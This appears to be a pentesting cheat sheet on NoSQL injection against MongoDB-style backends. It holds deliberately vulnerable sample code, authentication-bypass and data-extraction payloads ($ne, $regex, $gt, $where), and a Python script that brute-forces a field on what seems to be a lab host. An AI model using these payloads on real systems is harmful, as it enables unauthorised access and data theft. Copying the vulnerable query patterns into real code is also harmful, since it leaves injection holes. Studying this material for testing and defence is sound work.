# NoSQL Injection

- There are four main types of NoSQL databases.
- The way NoSQL databases store data varies significantly across the different categories and implementations.


| Type                      | Description                                                                                                                                 | Examples                         |
|---------------------------|---------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------|
| Document-Oriented Database | Stores data in documents which contain pairs of fields and values. These documents are typically encoded in formats such as JSON or XML.    | MongoDB, Amazon DynamoDB, Google Firebase – Cloud Firestore |
| Key-Value Database         | A data structure that stores data in key:value pairs, also known as a dictionary.                                                           | Redis, Amazon DynamoDB, Azure Cosmos DB                     |
| Wide-Column Store          | Used for storing enormous amounts of data in tables, rows, and columns like a relational database, but with the ability to handle ambiguous data types. | Apache Cassandra, Apache HBase, Azure Cosmos DB              |
| Graph Database             | Stores data in nodes and uses edges to define relationships.                                                                                 | Neo4j, Azure Cosmos DB, Virtuoso                             |


### Basics

- Sample vulnerable code

```javascript
app.post('/api/v1/getUser', (req, res) => {
    client.connect(function(_, con) {
        const cursor = con
            .db("example")
            .collection("users")
            .find({username: req.body['username']});
        cursor.toArray(function(_, result) {
            res.send(result);
        });
    });
});
```

- Sample exploit

```shell
curl -s -X POST http://127.0.0.1:3000/api/v1/getUser -H 'Content-Type: application/json' -d '{"username": {"$regex": ".*"}}'
```

### Authentication Bypass

- Sample vulnerable code:

```javascript
$query = new MongoDB\Driver\Query(array("email" => $_POST['email'], "password" => $_POST['password']));
```

- Exploitation:

```javascript
// JSON exploits
{
"email": "{$ne: 'randomemail'}",
"password": "{$ne: 'test'}"

"email": "{$regex: /.*/}",
"password": "{$regex: /.*/}"
}

// URL Encoded

// When you dont know nothing
email[$ne]=randomemail&&password[$ne]=test
email[$regex]=.*&&password[$regex]=.*

// When you know valid email
email=correctemail&password[$ne]=x

// Any string is 'greater than' an empty string
email[$gt]=&password[$gt]=
email[$gte]=&password[$gte]=
```

### In-Band Data Extraction

- Just inject a payload that will force the backend to return all data in the collection.

```shell
{$ne: 'doesntExist'}
{$gt: ''}

# This compares the first character of name to a Tilde character.
# Tilde is the largest printable ASCII value
{$lt: '~'}
```


### Sample Automation Script

```python
import requests
import string
import sys

URL = "http://94.237.121.111:43166/index.php"
SUCCESS_MARKER = "Franz"
CHARSET = string.digits + string.ascii_uppercase

session = requests.Session()
session.headers.update({"Content-Type": "application/json"})

def check(regex):
    try:
        r = session.post(
            URL,
            json={"trackingNum": {"$regex": regex}},
            timeout=5,
            allow_redirects=False
        )
        return SUCCESS_MARKER in r.text
    except requests.RequestException:
        return False

def main():
    tracking_id = ""
    print(f"[+] Attacking {URL}")

    while True:
        found = False
        for c in CHARSET:
            prefix = tracking_id + c

            if check(f"^{prefix}"):
                tracking_id += c
                print(f"[+] Retrieved: {tracking_id}")
                found = True
                break

        if not found:
            print("[-] Stopping.")
            sys.exit(1)

if __name__ == "__main__":
    main()
```

### Server-Side JavaScript Injection

- `$where` clause can be abused using the following payload:

```txt
db.users.find({$where: 'this.username == "" || ""=="" && this.password == "" || ""==""'})

" || ""=="
```

- Data can be exfiltrated using a similar payloads:

```txt
" || (this.username.match('^a.*')) || ""=="
```

### Automation

- Use the following wordlists with ffuf:
    - seclists/Fuzzing/Databases/NoSQL.txt
    - https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt

- Use `NoSQLMap`
